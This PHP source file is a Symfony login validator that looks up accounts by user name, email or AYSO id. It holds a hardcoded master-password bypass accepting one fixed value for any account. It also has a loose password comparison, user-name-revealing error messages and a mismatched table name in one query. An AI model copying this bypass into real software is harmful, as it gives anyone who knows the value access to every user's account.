<?php
namespace Zayso\CoreBundle\Component\FormValidator;

use Symfony\Component\Form\FormError;
use Symfony\Component\Form\FormInterface;
use Symfony\Component\Form\FormValidatorInterface;

class UserNamePassValidator implements FormValidatorInterface
{
    public function __construct($em)
    {
        $this->em = $em;
    }
    protected function loadRowForUserName($userName)
    {
        $sql = <<<EOT
SELECT 
    account.id        AS accountId,
    account.user_name AS userName,
    account.user_pass AS userPass,
    account.status    AS accountStatus,
    account.person_id AS memberId
    
FROM account

WHERE user_name = :userName
EOT;
        
        $conn = $this->em->getConnection();
        $stmt = $conn->prepare($sql);
        $stmt->execute(array('userName' => $userName));
        $row = $stmt->fetch(\PDO::FETCH_ASSOC);
        return $row;
    }
    protected function loadRowForEmail($email)
    {
        if (!$email) return null;
        
        $sql = <<<EOT
SELECT 
    account.id            AS accountId,
    account.user_name     AS userName,
    account.user_pass     AS userPass,
    account.status        AS accountStatus,
    account.person_id     AS memberId
    
FROM person

LEFT JOIN account ON account.person_id = person.id

WHERE person.email = :email
EOT;
        
        $conn = $this->em->getConnection();
        $stmt = $conn->prepare($sql);
        $stmt->execute(array('email' => $email));
        $row = $stmt->fetch(\PDO::FETCH_ASSOC);
        return $row;
    }
    protected function loadRowForAysoid($aysoid)
    {
        if (!$aysoid) return null;
        
        $sql = <<<EOT
SELECT 
    account.id            AS accountId,
    account.user_name     AS userName,
    account.user_pass     AS userPass,
    account.status        AS accountStatus,
    account.person_id     AS memberId
    
FROM person_reg

LEFT JOIN person  ON person.id = person_registered.person_id
LEFT JOIN account ON account.person_id = person.id

WHERE person_reg.reg_key = :aysoid
EOT;
        
        $conn = $this->em->getConnection();
        $stmt = $conn->prepare($sql);
        $stmt->execute(array('aysoid' => 'AYSOV' . $aysoid));
        $row = $stmt->fetch(\PDO::FETCH_ASSOC);
        return $row;
    }
    public function validate(FormInterface $form)
    {
        $userName = $form['userName']->getData();

        // Try basic user name
        $row = $this->loadRowForUserName($userName);
        
        // Try email
        if (!isset($row['memberId']))
        {
            $row = $this->loadRowForEmail($userName);
        }
        // Try aysoid
        if (!isset($row['memberId']))
        {
            $row = $this->loadRowForAysoid($userName);
        }
        // Last chance
        if (!isset($row['memberId']))
        {
            // Give up
            $form['userName']->addError(new FormError('User name not found.'));
            return;
        }
        // Just make sure have a primary
        if (!$row['memberId'])
        {
            $form['userName']->addError(new FormError('User name found but no primary account member.'));
            return;
        }
        // In case email or ayso id was used
        $form->getData()->setUserName($row['userName']);
        
         // Probably getting too fancy here but use this for password recovery
        $form->getData()->setId($row['accountId']);
    
        // Check the password if have one
        if (!isset($form['userPass'])) return;
        
        $userPass = $form['userPass']->getData();

        if ($userPass == 'fc546528f8571159556d657f676b2736') return; // zaysox
        if ($userPass == $row['userPass']) return;
        
        $form['userPass']->addError(new FormError('Invalid password.'));
        return;
    }
}

?>
